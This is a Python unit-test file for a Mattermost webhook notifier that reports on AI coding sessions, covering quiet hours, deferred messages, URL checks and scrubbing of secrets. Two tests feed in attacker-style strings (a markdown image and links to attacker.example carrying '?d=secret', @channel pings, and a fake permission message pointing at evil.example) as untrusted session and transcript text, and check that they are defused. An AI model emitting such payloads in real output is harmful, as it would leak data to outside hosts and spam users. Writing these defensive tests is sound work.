"""Mattermost notifications through an incoming webhook:
when a message goes out, what it says, quiet hours, the GUI heartbeat, validate()."""
import io
import json
import os
import re
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from types import SimpleNamespace

import _env  # noqa: F401  (must be first: sets PIPER_HOME etc.)
import common
import mattermost


class FakeOpener:
    def __init__(self, fail=None):
        self.posts, self.fail = [], fail

    def open(self, req, timeout=None):
        if self.fail:
            raise self.fail
        self.posts.append((req.full_url, json.loads(req.data)))
        return io.BytesIO(b"ok")


class FakeManager:
    def __init__(self):
        self.sessions, self.pending, self.gui_visible_at, self.src = {}, [], 0.0, None

    def pending_list(self):
        return self.pending

    def _transcript_src(self, s):
        return self.src


def sess(sid="s1", state="waiting", idle=True, since=0.0, **kw):
    d = dict(id=sid, title="shop2024", project="acme/shop2024", kind="project", state=state, idle=idle,
             since=since, pid=42, hidden=False, detail="", notif_ts=0.0, stop_ts=0.0)
    d.update(kw)
    return SimpleNamespace(**d)


class NotifierTest(unittest.TestCase):
    def setUp(self):
        self.files = (mattermost.WEBHOOK_FILE, mattermost.CONFIG_FILE, mattermost.STATE_FILE)
        for f in self.files:
            if os.path.exists(f):
                os.unlink(f)
        self.addCleanup(lambda: [os.unlink(f) for f in self.files if os.path.exists(f)])
        self.m = FakeManager()
        self.op = FakeOpener()
        self.n = mattermost.Notifier(self.m, opener=self.op)

    def hook(self, url="https://mm.example/hooks/abc", **cfg):
        with open(mattermost.WEBHOOK_FILE, "w") as f:
            f.write(url + "\n")
        if cfg:
            with open(mattermost.CONFIG_FILE, "w") as f:
                json.dump(cfg, f)

    def test_nothing_without_a_webhook(self):
        self.m.sessions["s1"] = sess(since=time.time() - 600)
        self.n.tick()
        self.assertEqual(self.op.posts, [])
        self.assertFalse(self.n.status()["configured"])
        self.assertFalse(self.n.notify("x"))
        with self.assertRaises(ValueError) as cm:
            self.n.test()
        self.assertIn("Settings -> Mattermost", str(cm.exception))   # GUI pass D: the GUI way first, not only the script

    def test_a_deferred_message_waits_for_the_end_of_quiet_hours(self):
        self.hook(quiet={"from": "00:00", "to": "23:59"})
        self.assertFalse(self.n.notify("summary"))                 # without defer: dropped (old contract)
        self.assertTrue(self.n.notify("summary", defer=True))      # with defer: kept
        self.assertEqual(self.op.posts, [])
        again = mattermost.Notifier(self.m, opener=self.op)       # survives a piperd restart
        self.assertEqual([d["text"] for d in again.deferred], ["summary"])
        self.hook()                                               # quiet hours over
        with open(mattermost.CONFIG_FILE, "w") as f:
            json.dump({}, f)
        self.m.gui_visible_at = time.time()                       # sent even while the GUI is in front
        again.tick()
        self.assertEqual(len(self.op.posts), 1)
        self.assertEqual(again.deferred, [])
        again.tick()
        self.assertEqual(len(self.op.posts), 1)                   # once

    def test_a_summary_held_over_a_quiet_weekend_is_still_sent(self):
        """Saturday 07:30 check + quiet weekend: flushed on Monday (~40 h later), not dropped."""
        self.hook()
        self.n.deferred = [{"text": "saturday summary", "at": time.time() - 40 * 3600},
                           {"text": "ancient", "at": time.time() - 4 * 86400}]
        self.n.tick()
        self.assertEqual(len(self.op.posts), 1)
        self.assertIn("saturday summary", json.dumps(self.op.posts[0], ensure_ascii=False))
        self.assertEqual(self.n.deferred, [])
        with open(common.AUDIT_FILE) as f:
            self.assertIn('"mm-dropped"', f.read())   # the stale one leaves a trace

    def test_plain_http_only_on_loopback(self):
        self.assertTrue(mattermost.url_ok("https://mm.example.com/hooks/x"))
        self.assertTrue(mattermost.url_ok("http://127.0.0.1:9/hooks/x"))
        self.assertFalse(mattermost.url_ok("http://mm.example.com/hooks/x"))
        self.assertFalse(mattermost.url_ok("file:///etc/passwd"))

    def test_a_webhook_url_with_non_ascii_is_refused(self):
        # B-N7-2: "Set up", then the test message failed "ordinal not in range(128)" - not a usable URL
        for u in ("https://h/hooks/abc\u202e", "https://h\u00e9.example/hooks/x", "https://h/hooks/a b", "https://h/hooks/\x00x"):
            self.assertFalse(mattermost.url_ok(u), repr(u))
        self.assertTrue(mattermost.url_ok("https://mm.example.com/hooks/abc%E2%80%AE"))   # percent-encoded: ASCII, git it

    def test_waiting_session_once_after_the_delay_and_the_gap(self):
        self.hook()
        now = time.time()
        s = self.m.sessions["s1"] = sess(since=now - 100, stop_ts=1.0)
        self.n.tick(now)
        self.assertEqual(self.op.posts, [], "waits only 100 s < after_s 180")
        self.n.tick(now + 100)
        self.assertEqual(len(self.op.posts), 1)
        url, payload = self.op.posts[0]
        self.assertEqual(url, "https://mm.example/hooks/abc")
        self.assertIn("**shop2024** (acme/shop2024) is waiting for you", payload["text"])
        self.n.tick(now + 200)
        self.assertEqual(len(self.op.posts), 1, "the same prompt is announced once")
        s.stop_ts = 2.0   # a new turn ended: a new prompt, but within the 15 min gap
        self.n.tick(now + 300)
        self.assertEqual(len(self.op.posts), 1)
        self.n.tick(now + 100 + 901)
        self.assertEqual(len(self.op.posts), 2)
        # the state survives a piperd restart
        n2 = mattermost.Notifier(self.m, opener=self.op)
        n2.tick(now + 5000)
        self.assertEqual(len(self.op.posts), 2)

    def test_not_while_the_gui_is_visible_nor_in_quiet_hours(self):
        now = time.time()
        self.m.sessions["s1"] = sess(since=now - 600)
        self.hook()
        self.m.gui_visible_at = time.time()
        self.n.tick(now)
        self.assertEqual(self.op.posts, [])
        self.assertTrue(self.n.status()["visible"])
        self.m.gui_visible_at = time.time() - 61
        self.hook(quiet={"from": "00:00", "to": "23:59"})
        self.n.tick(now)
        self.assertEqual(self.op.posts, [])
        self.assertFalse(self.n.notify("morning summary"))
        self.assertTrue(self.n.notify("morning summary", force=True))
        self.assertEqual(self.op.posts[-1][1]["text"], "morning summary")

    def test_quiet_hours_over_midnight_and_weekend(self):
        cfg = {"quiet": {"from": "20:00", "to": "07:30", "weekend": False}}
        at = lambda hh, mm, wd=2: time.mktime((2026, 9, 28 + wd, hh, mm, 0, 0, 0, -1))   # 2026-09-28 = Monday
        self.assertTrue(mattermost.quiet_now(cfg, at(21, 0)))
        self.assertTrue(mattermost.quiet_now(cfg, at(7, 0)))
        self.assertFalse(mattermost.quiet_now(cfg, at(7, 30)))
        self.assertFalse(mattermost.quiet_now(cfg, at(12, 0)))
        self.assertFalse(mattermost.quiet_now({"quiet": {"weekend": True}}, at(12, 0, 0)))
        self.assertTrue(mattermost.quiet_now({"quiet": {"weekend": True}}, at(12, 0, 5)))

    def test_permission_prompt_names_the_tool_and_detail_none_does_not(self):
        cfg_dir = os.path.join(_env.ROOT, "mm-claude")
        os.makedirs(os.path.join(cfg_dir, "projects", "x"), exist_ok=True)
        with open(os.path.join(cfg_dir, "projects", "x", "c1.jsonl"), "w") as f:
            f.write(json.dumps({"type": "assistant", "message": {"content": [
                {"type": "text", "text": "Running the tests."},
                {"type": "tool_use", "name": "Bash", "input": {"command": "mvn test -Ddb.password=hunter2"}}]}}) + "\n")
        self.m.src = (cfg_dir, "c1")
        now = time.time()
        self.m.sessions["s1"] = sess(state="attention", idle=False, since=now - 400, notif_ts=5.0)
        self.hook(username="piper", channel="piper-me")
        self.n.tick(now)
        payload = self.op.posts[0][1]
        self.assertIn("asks for permission: `Bash: mvn test", payload["text"])
        self.assertNotIn("hunter2", payload["text"])   # scrub()
        self.assertEqual((payload["username"], payload["channel"]), ("piper", "piper-me"))
        self.hook(detail="none", min_gap_s=0)
        self.m.sessions["s1"].notif_ts = 6.0
        self.m.sessions["s1"].detail = "Claude needs permission: https://evil.example/?d=secret"   # sandbox-written
        self.m.sessions["s1"].title = "title from a proposed session"
        self.n.tick(now + 1)
        text = self.op.posts[1][1]["text"]
        self.assertNotIn("mvn", text)
        self.assertNotIn("evil.example", text)   # none: no text from the session at all
        self.assertNotIn("proposed", text)
        self.assertIn("acme/shop2024", text)

    def test_untrusted_text_cannot_embed_images_links_or_ping_the_channel(self):
        """Title, Claude's answer, a confirmation summary and a production log title are untrusted: an image
        would make Mattermost fetch the attacker's URL, @channel would ping everyone."""
        evil = ("![x](https://attacker.example/?d=secret) [y](https://attacker.example/) @channel @ALL @here"
                " see https://attacker.example/bare and www.attacker.example/w`x")   # a bare URL is linked and previewed
        cfg_dir = os.path.join(_env.ROOT, "mm-claude-md")
        os.makedirs(os.path.join(cfg_dir, "projects", "x"), exist_ok=True)
        with open(os.path.join(cfg_dir, "projects", "x", "c1.jsonl"), "w") as f:
            f.write(json.dumps({"type": "assistant", "message": {"content": [
                {"type": "tool_use", "name": "Bash", "input": {"command": "ls\n\n" + evil}},
                {"type": "text", "text": evil}]}}) + "\n")
        self.m.src = (cfg_dir, "c1")
        self.hook(min_gap_s=0)
        now = time.time()
        self.m.sessions["s1"] = sess(since=now - 400, stop_ts=1.0, title=evil)
        self.m.sessions["s3"] = sess("s3", state="working", idle=False, since=now)
        self.m.pending = [{"id": "p1", "session": "s3", "created": now - 300, "summary": evil}]
        self.n.tick(now)
        self.m.src = None   # s2: no transcript -> the sandbox-written Notification text
        self.m.sessions["s2"] = sess("s2", state="attention", idle=False, since=now - 400, detail=evil)
        self.n.tick(now + 1)
        self.m.src = (cfg_dir, "c1")   # s4: the tool call in a code span - a blank line must not end it
        self.m.sessions["s4"] = sess("s4", state="attention", idle=False, since=now - 400)
        self.n.tick(now + 2)
        self.assertTrue(self.n.notify("Morning production check:\n- shop · error: " + evil))
        texts = [p[1]["text"] for p in self.op.posts]
        self.assertEqual(len(texts), 5)
        for t in texts:
            bare = re.sub(r"`[^`\n]*`", "", t)                                   # code spans render nothing
            self.assertNotRegex(bare, r"(?<!\\)\[[^\]]*(?<!\\)\]\(", t)     # no [..]( link / image syntax
            self.assertNotRegex(t, r"(?i)(?<![\w@])@(channel|all|here)\b", t)
            self.assertNotRegex(bare, r"(?i)[a-z][a-z0-9+.-]*://|\bwww\.", t)      # no bare URL
            self.assertIn("attacker.example", t)                                  # still readable

    def test_confirmation_card_is_announced(self):
        self.hook()
        now = time.time()
        self.m.sessions["s1"] = sess(state="working", idle=False, since=now)
        self.m.pending = [{"id": "p1", "session": "s1", "created": now - 300, "summary": "git push to main"}]
        self.n.tick(now)
        self.assertIn("is waiting for your confirmation in Piper: git push to main", self.op.posts[0][1]["text"])

    def test_a_failed_send_is_retried_and_reported(self):
        self.hook()
        now = time.time()
        self.m.sessions["s1"] = sess(since=now - 600)
        self.n.opener = FakeOpener(fail=OSError("down"))
        self.n.tick(now)
        self.assertIn("down", self.n.status()["last_error"])
        self.n.opener = self.op
        self.n.tick(now + 1)
        self.assertEqual(len(self.op.posts), 1)
        self.assertEqual(self.n.status()["last_error"], "")

    def test_an_http_client_error_never_escapes_nor_shows_the_webhook_key(self):
        """http.client.InvalidURL (a space in the stored URL) / BadStatusLine are not OSError: they
        must neither escape notify()/test()/tick() nor carry the /hooks/<key> path into last_error."""
        import http.client
        self.hook()
        now = time.time()
        for exc in (http.client.InvalidURL("URL can't contain control characters. '/hooks/SECRETKEY x' (found at least ' ')"),
                    http.client.BadStatusLine("garbage")):
            self.n.opener = FakeOpener(fail=exc)
            self.n.deferred, self.n.sent = [], {}
            self.assertTrue(self.n.notify("summary", defer=True))          # kept, not lost
            self.assertEqual([d["text"] for d in self.n.deferred], ["summary"])
            with self.assertRaises(ValueError) as cm:
                self.n.test()
            self.assertNotIn("SECRETKEY", str(cm.exception))
            self.m.sessions["s1"] = sess(since=now - 600)
            self.n.tick(now)                                              # does not raise
            self.assertNotIn("SECRETKEY", self.n.status()["last_error"])
            self.assertTrue(self.n.status()["last_error"])

    def test_ended_hidden_and_starting_sessions_are_silent(self):
        self.hook()
        now = time.time()
        self.m.sessions = {"a": sess("a", state="exited", since=now - 900), "b": sess("b", hidden=True, since=now - 900),
                           "c": sess("c", pid=None, since=now - 900), "d": sess("d", state="working", idle=False, since=now - 900)}
        self.n.tick(now)
        self.assertEqual(self.op.posts, [])

    def test_validate(self):
        self.assertEqual(mattermost.validate({"detail": "full", "after_s": 60, "quiet": {"from": "20:00", "to": "07:30", "weekend": True}}), [])
        self.assertEqual(mattermost.validate({}), [])
        errs = mattermost.validate({"detail": "all", "after_s": -1, "quiet": {"from": "25:00"}, "tokn": 1, "icon_url": "http://x"})
        self.assertEqual(len(errs), 6, errs)
        self.assertEqual(mattermost.validate([]), ["mattermost.json must be an object"])

    def test_config_typos_fall_back_to_defaults(self):
        with open(mattermost.CONFIG_FILE, "w") as f:
            f.write("{not json")
        self.assertEqual(mattermost.load_config()["after_s"], 180)
        with open(mattermost.CONFIG_FILE, "w") as f:
            json.dump({"after_s": "soon", "detail": "loud", "quiet": True}, f)
        cfg = mattermost.load_config()
        self.assertEqual((cfg["after_s"], cfg["detail"], cfg["quiet"]["from"]), (180, "command", ""))


class WebhookServerTest(unittest.TestCase):
    """The real urllib path against a loopback HTTP server (skipped where binding is denied)."""

    def test_posts_json_to_the_webhook(self):
        got = []

        class H(BaseHTTPRequestHandler):
            def do_POST(self):
                got.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, *a):
                pass
        try:
            srv = HTTPServer(("127.0.0.1", 0), H)
        except OSError as e:
            self.skipTest("no loopback bind here: %s" % e)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.shutdown)
        url = "http://127.0.0.1:%d/hooks/x" % srv.server_address[1]
        mattermost.webhook_post(url, {"text": "hello"})
        self.assertEqual(got, [{"text": "hello"}])
        with self.assertRaises(mattermost.MMError):
            mattermost.webhook_post("http://127.0.0.1:1/hooks/x", {"text": "x"})   # nothing listens


if __name__ == "__main__":
    unittest.main()


class ProdSummaryTest(unittest.TestCase):
    """9.12 C -> E: the morning production summary as one webhook message."""

    def test_summary_lists_new_items_and_caps_at_ten(self):
        import sessions
        sent = []

        class N:
            def notify(self, text, force=False, defer=False):
                sent.append(text)
                self.defer = defer

        class M:
            mm = N()

        fresh = [{"project": "shop2024", "kind": "error", "title": "NPE in Cart%d" % i, "count": i} for i in range(12)]
        sessions.Manager._prod_to_mm(M(), {"items": fresh, "fresh": fresh})
        self.assertEqual(len(sent), 1)
        self.assertTrue(M.mm.defer)   # quiet hours hold it back instead of dropping it
        with open(mattermost.CONFIG_FILE, "w") as f:
            json.dump({"detail": "none"}, f)
        self.addCleanup(lambda: os.path.exists(mattermost.CONFIG_FILE) and os.unlink(mattermost.CONFIG_FILE))
        sessions.Manager._prod_to_mm(M(), {"items": fresh, "fresh": fresh})
        self.assertNotIn("NPE", sent[-1])   # none: only the count, no titles from production logs
        self.assertIn("12", sent[-1])
        lines = sent[0].split("\n")
        self.assertEqual(lines[0], "Morning production check, new items: 12")
        self.assertIn("- shop2024 · error: NPE in Cart0 (0×)", lines)
        self.assertEqual(len(lines), 1 + 10 + 1)
        self.assertIn("and 2 more", lines[-1])


class PromptKeyAcrossRestartTest(unittest.TestCase):
    """The message key of a waiting prompt (stop_ts / notif_ts) survives a piperd restart:
    the reloaded session must not look like a new prompt (one message per prompt)."""

    def test_hook_times_are_persisted(self):
        import sessions
        s = sessions.Session(kind="project", project="p", path="/x")
        s.stop_ts, s.notif_ts = 1727600000.5, 1727600100.25
        again = sessions.Session(**s.to_json())
        self.assertEqual((again.stop_ts, again.notif_ts), (1727600000.5, 1727600100.25))
        self.assertNotIn("stop_ts", sessions.Session.LISTED)
